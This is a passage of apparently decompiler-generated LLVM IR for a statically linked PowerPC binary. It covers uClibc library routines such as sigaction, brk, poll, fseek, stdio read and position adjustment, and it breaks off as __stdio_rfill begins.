  store i32 268514512, i32* @lr, align 4
  %v4_100134cc = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1001343c

dec_label_pc_100134d4:                            ; preds = %dec_label_pc_1001345c
  %v3_100134d4 = icmp eq i32 %v0_100134d4, 2
  br i1 %v3_100134d4, label %dec_label_pc_100134dc, label %dec_label_pc_100134e8

dec_label_pc_100134dc:                            ; preds = %dec_label_pc_100134d4
  store i32 3, i32* @global_var_10028844.724, align 4
  br label %dec_label_pc_100134e8

dec_label_pc_100134e8:                            ; preds = %dec_label_pc_100134d4, %dec_label_pc_100134dc
  %v3_100134e8 = phi i32 [ %v0_100134d4, %dec_label_pc_100134d4 ], [ 3, %dec_label_pc_100134dc ]
  %v1_100134f0 = icmp ne i32 %v3_100134e8, 3
  call void @__pseudo_cond_branch(i1 %v1_100134f0, i32 268514564)
  store i32 4, i32* @global_var_10028844.724, align 4
  %v1_10013500 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10013500

; uselistorder directives
  uselistorder i32 %v1_100134b4, { 1, 0 }
  uselistorder i32 %v1_100134b0, { 1, 0 }
  uselistorder i32 %v1_100133fc, { 1, 0 }
  uselistorder i32 %v1_100133f8, { 1, 0 }
  uselistorder i32 %v2_100133dc, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 2, 5, 6, 8, 7, 3, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 4, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder i32 127, { 1, 5, 0, 2, 4, 6, 7, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 4, 2, 3, 0, 1 }
  uselistorder i32* @global_var_10028844.724, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268632064, { 26, 27, 20, 0, 21, 22, 1, 31, 3, 2, 10, 4, 25, 23, 24, 15, 16, 17, 14, 28, 29, 30, 18, 19, 5, 11, 6, 7, 8, 12, 13, 9 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_100134e8, { 1, 0 }
  uselistorder label %dec_label_pc_100134a4.dec_label_pc_100134a4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001345c, { 1, 0 }
  uselistorder label %dec_label_pc_10013424, { 1, 0 }
  uselistorder label %dec_label_pc_100133f0.dec_label_pc_100133f0_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1001350c = add i32 %arg1, 28
  %v2_1001350c = inttoptr i32 %v1_1001350c to i32*
  %v3_1001350c = load i32, i32* %v2_1001350c, align 4
  store i32 %v3_1001350c, i32* @global_var_10028848.727, align 4
  %v1_1001351c = add i32 %arg1, 44
  %v2_1001351c = inttoptr i32 %v1_1001351c to i32*
  %v3_1001351c = load i32, i32* %v2_1001351c, align 4
  store i32 %v3_1001351c, i32* @global_var_1002884c.728, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10028850.691, align 4
  %v0_10013550 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10013550)
  store i32 12, i32* @r3, align 4
  %v0_10013558 = call i32 @__syscall_error()
  ret i32 %v0_10013558

; uselistorder directives
  uselistorder i32* @global_var_10028850.691, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10013574 = call i32 @__asm_mfcr()
  %v1_10013578 = and i32 %v0_10013574, 268435456
  %v3_10013578 = icmp eq i32 %v1_10013578, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10013574, i32* %r31.global-to-local, align 4
  br i1 %v3_10013578, label %dec_label_pc_10013590, label %dec_label_pc_10013584

dec_label_pc_10013584:                            ; preds = %entry
  %v0_10013584 = call i32 @__errno_location()
  %v0_10013588 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013588 = inttoptr i32 %v0_10013584 to i32*
  store i32 %v0_10013588, i32* %v2_10013588, align 4
  br label %dec_label_pc_10013590

dec_label_pc_10013590:                            ; preds = %entry, %dec_label_pc_10013584
  %v0_100135a0 = phi i32 [ %v0_10013574, %entry ], [ -1, %dec_label_pc_10013584 ]
  ret i32 %v0_100135a0

; uselistorder directives
  uselistorder i1* @cr0_so, { 3, 0, 7, 8, 9, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_10013590, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100135bc = call i32 @__asm_mfcr()
  %v1_100135c0 = and i32 %v0_100135bc, 268435456
  %v3_100135c0 = icmp eq i32 %v1_100135c0, 0
  store i32 %v0_100135bc, i32* %r31.global-to-local, align 4
  br i1 %v3_100135c0, label %dec_label_pc_100135d8, label %dec_label_pc_100135cc

dec_label_pc_100135cc:                            ; preds = %entry
  %v0_100135cc = call i32 @__errno_location()
  %v0_100135d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100135d0 = inttoptr i32 %v0_100135cc to i32*
  store i32 %v0_100135d0, i32* %v2_100135d0, align 4
  br label %dec_label_pc_100135d8

dec_label_pc_100135d8:                            ; preds = %entry, %dec_label_pc_100135cc
  %v0_100135e8 = phi i32 [ %v0_100135bc, %entry ], [ -1, %dec_label_pc_100135cc ]
  ret i32 %v0_100135e8

; uselistorder directives
  uselistorder label %dec_label_pc_100135d8, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100135ec = load i32, i32* @r5, align 4
  store i32 %v0_100135ec, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_100135f4 = zext i1 %tmp to i32
  %v2_100135f4 = ashr i32 %arg1, 31
  %v3_100135f4 = and i32 %v2_100135f4, -2
  %v4_100135f4 = or i32 %v3_100135f4, %v1_100135f4
  %v3_100135f8 = inttoptr i32 %v4_100135f4 to i16*
  %v4_100135f8 = call i32 @__GI_fseeko64(i16* %v3_100135f8, i32 %arg1, i32 %v0_100135ec)
  ret i32 %v4_100135f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_100135fc = load i32, i32* @r7, align 4
  %v0_10013600 = load i32, i32* @lr, align 4
  store i32 %v0_10013600, i32* %r0.global-to-local, align 4
  store i32 %v0_100135fc, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_100135fc, 3
  br i1 %tmp9, label %dec_label_pc_10013638, label %dec_label_pc_10013624

dec_label_pc_10013624:                            ; preds = %entry
  %v0_10013624 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10013630 = inttoptr i32 %v0_10013624 to i32*
  store i32 22, i32* %v2_10013630, align 4
  br label %dec_label_pc_10013700

dec_label_pc_10013638:                            ; preds = %entry
  %v2_10013638 = add i32 %tmp, 52
  %v3_10013638 = inttoptr i32 %v2_10013638 to i32*
  %v4_10013638 = load i32, i32* %v3_10013638, align 4
  store i32 %v4_10013638, i32* @r28, align 4
  %v3_1001363c = icmp eq i32 %v4_10013638, 0
  br i1 %v3_1001363c, label %dec_label_pc_10013644, label %dec_label_pc_10013664

dec_label_pc_10013644:                            ; preds = %dec_label_pc_10013638
  %v2_10013644 = add i32 %tmp, 56
  store i32 %v2_10013644, i32* @r29, align 4
  %v2_1001364c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1001364c, i32* @r3, align 4
  %v0_10013658 = call i32 @__pthread_return_void()
  %v0_10013660 = call i32 @__pthread_return_0()
  %v0_10013664.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013664

dec_label_pc_10013664:                            ; preds = %dec_label_pc_10013638, %dec_label_pc_10013644
  %v0_10013670 = phi i32 [ %tmp, %dec_label_pc_10013638 ], [ %v0_10013664.pre, %dec_label_pc_10013644 ]
  %v1_10013664 = inttoptr i32 %v0_10013670 to i16*
  %v2_10013664 = load i16, i16* %v1_10013664, align 2
  %v3_10013664 = zext i16 %v2_10013664 to i32
  store i32 %v3_10013664, i32* %r0.global-to-local, align 4
  %v1_10013668 = and i32 %v3_10013664, 64
  store i32 %v1_10013668, i32* %r9.global-to-local, align 4
  %v3_10013668 = icmp eq i32 %v1_10013668, 0
  br i1 %v3_10013668, label %dec_label_pc_10013680, label %dec_label_pc_10013670

dec_label_pc_10013670:                            ; preds = %dec_label_pc_10013664
  store i32 %v0_10013670, i32* @r3, align 4
  store i32 268514936, i32* @lr, align 4
  %v0_10013674 = call i32 @__stdio_wcommit()
  %v3_10013678 = icmp eq i32 %v0_10013674, 0
  br i1 %v3_10013678, label %dec_label_pc_10013680, label %dec_label_pc_100136e8

dec_label_pc_10013680:                            ; preds = %dec_label_pc_10013670, %dec_label_pc_10013664
  %v0_10013680 = load i32, i32* @r30, align 4
  %v3_10013680 = icmp eq i32 %v0_10013680, 1
  br i1 %v3_10013680, label %dec_label_pc_10013688, label %dec_label_pc_10013680.dec_label_pc_1001369c_crit_edge

dec_label_pc_10013680.dec_label_pc_1001369c_crit_edge: ; preds = %dec_label_pc_10013680
  br label %dec_label_pc_1001369c

dec_label_pc_10013688:                            ; preds = %dec_label_pc_10013680
  %v0_10013688 = load i32, i32* @r31, align 4
  %v1_10013688 = inttoptr i32 %v0_10013688 to i16*
  %v2_1001368c = ptrtoint i32* %stack_var_-56 to i32
  store i32 268514964, i32* @lr, align 4
  %v4_10013690 = call i32 @__stdio_adjust_position(i16* %v1_10013688, i32 %v2_1001368c)
  %v1_10013694 = icmp slt i32 %v4_10013690, 0
  br i1 %v1_10013694, label %dec_label_pc_100136e8, label %dec_label_pc_10013688.dec_label_pc_1001369c_crit_edge

dec_label_pc_10013688.dec_label_pc_1001369c_crit_edge: ; preds = %dec_label_pc_10013688
  %v0_1001369c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001369c

dec_label_pc_1001369c:                            ; preds = %dec_label_pc_10013680.dec_label_pc_1001369c_crit_edge, %dec_label_pc_10013688.dec_label_pc_1001369c_crit_edge
  %v0_1001369c = phi i32 [ %v0_10013680, %dec_label_pc_10013680.dec_label_pc_1001369c_crit_edge ], [ %v0_1001369c.pre, %dec_label_pc_10013688.dec_label_pc_1001369c_crit_edge ]
  %v0_100136a0 = load i32, i32* @r31, align 4
  store i32 268514988, i32* @lr, align 4
  %v5_100136a8 = call i32 @__stdio_seek(i32 %v0_100136a0, i32* nonnull %stack_var_-56, i32 %v0_1001369c)
  %v1_100136ac = icmp slt i32 %v5_100136a8, 0
  br i1 %v1_100136ac, label %dec_label_pc_100136e8, label %dec_label_pc_100136b4

dec_label_pc_100136b4:                            ; preds = %dec_label_pc_1001369c
  %v0_100136b4 = load i32, i32* @r31, align 4
  %v1_100136b4 = inttoptr i32 %v0_100136b4 to i16*
  %v2_100136b4 = load i16, i16* %v1_100136b4, align 2
  %v3_100136b4 = zext i16 %v2_100136b4 to i32
  store i32 %v3_100136b4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100136bc = add i32 %v0_100136b4, 8
  %v2_100136bc = inttoptr i32 %v1_100136bc to i32*
  %v3_100136bc = load i32, i32* %v2_100136bc, align 4
  store i32 %v3_100136bc, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_100136c4 = and i32 %v3_100136b4, 65464
  store i32 %v1_100136c4, i32* %r0.global-to-local, align 4
  %v3_100136c8 = add i32 %v0_100136b4, 2
  %v4_100136c8 = inttoptr i32 %v3_100136c8 to i8*
  store i8 0, i8* %v4_100136c8, align 1
  %v0_100136cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100136cc = load i32, i32* @r31, align 4
  %v2_100136cc = add i32 %v1_100136cc, 28
  %v3_100136cc = inttoptr i32 %v2_100136cc to i32*
  store i32 %v0_100136cc, i32* %v3_100136cc, align 4
  %v0_100136d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100136d0 = trunc i32 %v0_100136d0 to i16
  %v2_100136d0 = load i32, i32* @r31, align 4
  %v3_100136d0 = inttoptr i32 %v2_100136d0 to i16*
  store i16 %v1_100136d0, i16* %v3_100136d0, align 2
  %v0_100136d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100136d4 = load i32, i32* @r31, align 4
  %v2_100136d4 = add i32 %v1_100136d4, 16
  %v3_100136d4 = inttoptr i32 %v2_100136d4 to i32*
  store i32 %v0_100136d4, i32* %v3_100136d4, align 4
  %v0_100136d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100136d8 = load i32, i32* @r31, align 4
  %v2_100136d8 = add i32 %v1_100136d8, 20
  %v3_100136d8 = inttoptr i32 %v2_100136d8 to i32*
  store i32 %v0_100136d8, i32* %v3_100136d8, align 4
  %v0_100136dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100136dc = load i32, i32* @r31, align 4
  %v2_100136dc = add i32 %v1_100136dc, 24
  %v3_100136dc = inttoptr i32 %v2_100136dc to i32*
  store i32 %v0_100136dc, i32* %v3_100136dc, align 4
  %v0_100136e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100136e0 = load i32, i32* @r31, align 4
  %v2_100136e0 = add i32 %v1_100136e0, 44
  %v3_100136e0 = inttoptr i32 %v2_100136e0 to i32*
  store i32 %v0_100136e0, i32* %v3_100136e0, align 4
  br label %dec_label_pc_100136ec

dec_label_pc_100136e8:                            ; preds = %dec_label_pc_10013670, %dec_label_pc_1001369c, %dec_label_pc_10013688
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_100136ec

dec_label_pc_100136ec:                            ; preds = %dec_label_pc_100136b4, %dec_label_pc_100136e8
  %v0_100136ec = load i32, i32* @r28, align 4
  %v3_100136ec = icmp eq i32 %v0_100136ec, 0
  br i1 %v3_100136ec, label %dec_label_pc_100136f4, label %dec_label_pc_10013700

dec_label_pc_100136f4:                            ; preds = %dec_label_pc_100136ec
  %v2_100136f4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100136f4, i32* @r3, align 4
  %v0_100136fc = call i32 @__pthread_return_void()
  br label %dec_label_pc_10013700

dec_label_pc_10013700:                            ; preds = %dec_label_pc_100136ec, %dec_label_pc_10013624, %dec_label_pc_100136f4
  store i32 %v0_10013600, i32* %r0.global-to-local, align 4
  %v0_10013704 = load i32, i32* @r30, align 4
  ret i32 %v0_10013704

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 4, 3, 2, 23, 22, 21, 20, 19, 18, 0, 35, 44, 43, 16, 42, 41, 40, 39, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 17, 29, 28, 27, 31, 30, 38, 26, 37, 1, 25, 24, 34, 33, 32 }
  uselistorder i32 ()* @__pthread_return_void, { 43, 42, 39, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 0, 41, 40, 51, 50, 49, 48, 3, 2, 5, 4, 28, 27, 26, 25, 24, 23, 32, 31, 30, 29, 47, 46, 22, 21, 45, 44, 20, 19, 18, 17, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 56, { 1, 5, 4, 0, 2, 3 }
  uselistorder i32 52, { 2, 3, 9, 0, 5, 1, 8, 6, 4, 7 }
  uselistorder i32 22, { 2, 14, 12, 3, 13, 4, 5, 17, 6, 19, 7, 15, 8, 9, 16, 10, 11, 0, 1, 18 }
  uselistorder label %dec_label_pc_10013700, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100136ec, { 1, 0 }
  uselistorder label %dec_label_pc_100136e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001369c, { 1, 0 }
  uselistorder label %dec_label_pc_10013664, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10013724 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10013730 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10013738 = and i16 %v3_10013730, 4
  %v3_10013738 = icmp eq i16 %v1_10013738, 0
  br i1 %v3_10013738, label %dec_label_pc_10013740, label %dec_label_pc_10013778

dec_label_pc_10013740:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1001374c, label %dec_label_pc_10013744

dec_label_pc_10013744:                            ; preds = %dec_label_pc_10013740
  br label %dec_label_pc_1001374c

dec_label_pc_1001374c:                            ; preds = %dec_label_pc_10013740, %dec_label_pc_10013744
  %v1_1001374c = add i32 %tmp, 4
  %v2_1001374c = inttoptr i32 %v1_1001374c to i32*
  %v3_1001374c = load i32, i32* %v2_1001374c, align 4
  store i32 %v3_1001374c, i32* %r3.global-to-local, align 4
  store i32 268515156, i32* @lr, align 4
  %v1_10013750 = call i32 @__libc_read(i32 %v3_1001374c)
  store i32 %v1_10013750, i32* %r3.global-to-local, align 4
  %v2_10013754 = icmp sgt i32 %v1_10013750, 0
  br i1 %v2_10013754, label %dec_label_pc_10013778, label %dec_label_pc_1001375c

dec_label_pc_1001375c:                            ; preds = %dec_label_pc_1001374c
  %v3_10013754 = icmp eq i32 %v1_10013750, 0
  %v0_1001375c = load i32, i32* @r31, align 4
  %v1_1001375c = inttoptr i32 %v0_1001375c to i16*
  %v2_1001375c = load i16, i16* %v1_1001375c, align 2
  br i1 %v3_10013754, label %dec_label_pc_10013764, label %dec_label_pc_1001376c

dec_label_pc_10013764:                            ; preds = %dec_label_pc_1001375c
  %v1_10013764 = or i16 %v2_1001375c, 4
  br label %dec_label_pc_10013774

dec_label_pc_1001376c:                            ; preds = %dec_label_pc_1001375c
  %v1_1001376c = or i16 %v2_1001375c, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013774

dec_label_pc_10013774:                            ; preds = %dec_label_pc_10013764, %dec_label_pc_1001376c
  %v1_10013764.sink.off0 = phi i16 [ %v1_10013764, %dec_label_pc_10013764 ], [ %v1_1001376c, %dec_label_pc_1001376c ]
  store i16 %v1_10013764.sink.off0, i16* %v1_1001375c, align 2
  %v0_10013788.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013778

dec_label_pc_10013778:                            ; preds = %entry, %dec_label_pc_1001374c, %dec_label_pc_10013774
  %v0_10013788 = phi i32 [ 0, %entry ], [ %v1_10013750, %dec_label_pc_1001374c ], [ %v0_10013788.pre, %dec_label_pc_10013774 ]
  store i32 %v0_10013724, i32* @r31, align 4
  ret i32 %v0_10013788

; uselistorder directives
  uselistorder i16 %v2_1001375c, { 1, 0 }
  uselistorder i32 %v1_10013750, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10013778, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013774, { 1, 0 }
  uselistorder label %dec_label_pc_1001374c, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_100137a4 = load i16, i16* %arg1, align 2
  %v4_100137a4 = zext i16 %v3_100137a4 to i32
  %tmp9 = urem i16 %v3_100137a4, 4
  %v3_100137a8 = icmp eq i16 %tmp9, 0
  br i1 %v3_100137a8, label %dec_label_pc_100137f4, label %dec_label_pc_100137b0

dec_label_pc_100137b0:                            ; preds = %entry
  %v1_100137a8 = zext i16 %tmp9 to i32
  %v1_100137b0 = add nsw i32 %v1_100137a8, -1
  store i32 %v1_100137b0, i32* %r10.global-to-local, align 4
  %v4_100137b0 = icmp eq i32 %v1_100137b0, 0
  br i1 %v4_100137b0, label %dec_label_pc_100137f4, label %dec_label_pc_100137b8

dec_label_pc_100137b8:                            ; preds = %dec_label_pc_100137b0
  %v1_100137b8 = and i32 %v4_100137a4, 2048
  %v3_100137b8 = icmp eq i32 %v1_100137b8, 0
  br i1 %v3_100137b8, label %dec_label_pc_100137f4, label %dec_label_pc_100137c0

dec_label_pc_100137c0:                            ; preds = %dec_label_pc_100137b8
  %v2_100137c0 = icmp sgt i32 %v1_100137b0, 1
  br i1 %v2_100137c0, label %dec_label_pc_1001386c, label %dec_label_pc_100137c8

dec_label_pc_100137c8:                            ; preds = %dec_label_pc_100137c0
  %v2_100137c8 = add i32 %tmp, 40
  %v3_100137c8 = inttoptr i32 %v2_100137c8 to i32*
  %v4_100137c8 = load i32, i32* %v3_100137c8, align 4
  %v3_100137cc = icmp eq i32 %v4_100137c8, 0
  br i1 %v3_100137cc, label %dec_label_pc_100137d4, label %dec_label_pc_1001386c

dec_label_pc_100137d4:                            ; preds = %dec_label_pc_100137c8
  %v2_100137d4 = add i32 %tmp, 44
  %v3_100137d4 = inttoptr i32 %v2_100137d4 to i32*
  %v4_100137d4 = load i32, i32* %v3_100137d4, align 4
  %v2_100137d8 = add i32 %tmp, 3
  %v3_100137d8 = inttoptr i32 %v2_100137d8 to i8*
  %v4_100137d8 = load i8, i8* %v3_100137d8, align 1
  %v5_100137d8 = zext i8 %v4_100137d8 to i32
  %v2_100137e0 = sub nsw i32 %v1_100137b0, %v5_100137d8
  %v1_100137e4 = add nsw i32 %v2_100137e0, -1
  store i32 %v1_100137e4, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_100137d4, 1
  br i1 %tmp7, label %dec_label_pc_100137f4, label %dec_label_pc_100137ec

dec_label_pc_100137ec:                            ; preds = %dec_label_pc_100137d4
  %v2_100137ec = add i32 %tmp, 2
  %v3_100137ec = inttoptr i32 %v2_100137ec to i8*
  %v4_100137ec = load i8, i8* %v3_100137ec, align 1
  %v5_100137ec = zext i8 %v4_100137ec to i32
  %v2_100137f0 = sub nsw i32 %v1_100137e4, %v5_100137ec
  store i32 %v2_100137f0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100137f4

dec_label_pc_100137f4:                            ; preds = %dec_label_pc_100137d4, %dec_label_pc_100137b8, %dec_label_pc_100137b0, %entry, %dec_label_pc_100137ec
  %v0_10013818 = phi i32 [ %v1_100137e4, %dec_label_pc_100137d4 ], [ %v1_100137b0, %dec_label_pc_100137b8 ], [ 0, %dec_label_pc_100137b0 ], [ 0, %entry ], [ %v2_100137f0, %dec_label_pc_100137ec ]
  %v1_100137f4 = and i32 %v4_100137a4, 64
  %v3_100137f4 = icmp eq i32 %v1_100137f4, 0
  %storemerge.in.in.v = select i1 %v3_100137f4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_10013808 = add i32 %tmp, 16
  %v3_10013808 = inttoptr i32 %v2_10013808 to i32*
  %v4_10013808 = load i32, i32* %v3_10013808, align 4
  %v1_1001380c = inttoptr i32 %arg2 to i32*
  %v2_1001380c = load i32, i32* %v1_1001380c, align 4
  store i32 %v2_1001380c, i32* %r4.global-to-local, align 4
  %v2_10013810 = sub i32 %storemerge, %v4_10013808
  %v1_10013814 = add i32 %arg2, 4
  %v2_10013814 = inttoptr i32 %v1_10013814 to i32*
  %v3_10013814 = load i32, i32* %v2_10013814, align 4
  store i32 %v3_10013814, i32* %r5.global-to-local, align 4
  %v2_10013818 = add i32 %v2_10013810, %v0_10013818
  store i32 %v2_10013818, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_10013818, 0
  %v1_10013820 = zext i1 %tmp10 to i32
  %v2_10013820 = ashr i32 %v2_10013818, 31
  %v3_10013820 = and i32 %v2_10013820, -2
  %v4_10013820 = or i32 %v3_10013820, %v1_10013820
  %v2_10013824 = sub i32 %v3_10013814, %v2_10013818
  %v3_10013824 = sub i32 -1, %v2_10013818
  store i32 %v2_10013824, i32* %r10.global-to-local, align 4
  %v6_10013824 = icmp ule i32 %v2_10013824, %v3_10013824
  %v2_10013828 = sub nsw i32 -1, %v4_10013820
  %v3_10013828 = add i32 %v2_1001380c, %v2_10013828
  %v5_10013828 = zext i1 %v6_10013824 to i32
  %v6_10013828 = add i32 %v3_10013828, %v5_10013828
  store i32 %v6_10013828, i32* %v1_1001380c, align 4
  %v0_10013830 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013830 = load i32, i32* @r8, align 4
  %v2_10013830 = add i32 %v1_10013830, 4
  %v3_10013830 = inttoptr i32 %v2_10013830 to i32*
  store i32 %v0_10013830, i32* %v3_10013830, align 4
  %v0_10013834 = load i32, i32* @r8, align 4
  %v1_10013834 = inttoptr i32 %v0_10013834 to i32*
  %v2_10013834 = load i32, i32* %v1_10013834, align 4
  %v1_10013838 = load i32, i32* %r4.global-to-local, align 4
  %v3_10013838 = icmp sgt i32 %v2_10013834, %v1_10013838
  br i1 %v3_10013838, label %dec_label_pc_10013850, label %dec_label_pc_10013840

dec_label_pc_10013840:                            ; preds = %dec_label_pc_100137f4
  %v4_10013838 = icmp eq i32 %v2_10013834, %v1_10013838
  br i1 %v4_10013838, label %dec_label_pc_10013844, label %dec_label_pc_10013854thread-pre-split

dec_label_pc_10013844:                            ; preds = %dec_label_pc_10013840
  %v1_10013844 = add i32 %v0_10013834, 4
  %v2_10013844 = inttoptr i32 %v1_10013844 to i32*
  %v3_10013844 = load i32, i32* %v2_10013844, align 4
  %v1_10013848 = load i32, i32* %r5.global-to-local, align 4
  %v3_10013848 = icmp ugt i32 %v3_10013844, %v1_10013848
  br i1 %v3_10013848, label %dec_label_pc_10013850, label %dec_label_pc_10013854thread-pre-split

dec_label_pc_10013850:                            ; preds = %dec_label_pc_10013844, %dec_label_pc_100137f4
  %v0_10013850 = load i32, i32* %r31.global-to-local, align 4
  %v1_10013850 = sub i32 0, %v0_10013850
  store i32 %v1_10013850, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013854

dec_label_pc_10013854thread-pre-split:            ; preds = %dec_label_pc_10013840, %dec_label_pc_10013844
  %v0_10013854.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013854

dec_label_pc_10013854:                            ; preds = %dec_label_pc_10013854thread-pre-split, %dec_label_pc_10013850
  %v0_10013854 = phi i32 [ %v0_10013854.pr, %dec_label_pc_10013854thread-pre-split ], [ %v1_10013850, %dec_label_pc_10013850 ]
  %tmp8 = icmp sgt i32 %v0_10013854, -1
  br i1 %tmp8, label %dec_label_pc_10013870, label %dec_label_pc_1001385c

dec_label_pc_1001385c:                            ; preds = %dec_label_pc_10013854
  %v0_1001385c = call i32 @__errno_location()
  %v2_10013864 = inttoptr i32 %v0_1001385c to i32*
  store i32 75, i32* %v2_10013864, align 4
  %v0_10013874.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013870

dec_label_pc_1001386c:                            ; preds = %dec_label_pc_100137c8, %dec_label_pc_100137c0
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013870

dec_label_pc_10013870:                            ; preds = %dec_label_pc_10013854, %dec_label_pc_1001385c, %dec_label_pc_1001386c
  %v0_10013874 = phi i32 [ %v0_10013854, %dec_label_pc_10013854 ], [ %v0_10013874.pre, %dec_label_pc_1001385c ], [ -1, %dec_label_pc_1001386c ]
  ret i32 %v0_10013874

; uselistorder directives
  uselistorder i32 %v2_10013834, { 1, 0 }
  uselistorder i32 %v2_10013818, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 2048, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10013870, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013854thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_100137f4, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
